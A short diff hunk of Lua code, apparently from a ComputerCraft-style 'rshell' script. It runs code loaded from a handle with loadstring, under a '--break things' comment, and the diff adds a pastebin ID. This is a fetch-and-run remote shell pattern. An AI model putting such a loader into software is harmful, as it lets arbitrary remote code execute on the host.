@@ -9,3 +9,5 @@ s = loadstring(h.readAll())
 --break things
 print("give command to rshell...")
 s()
+
+--pastebin: z3ML3xhm
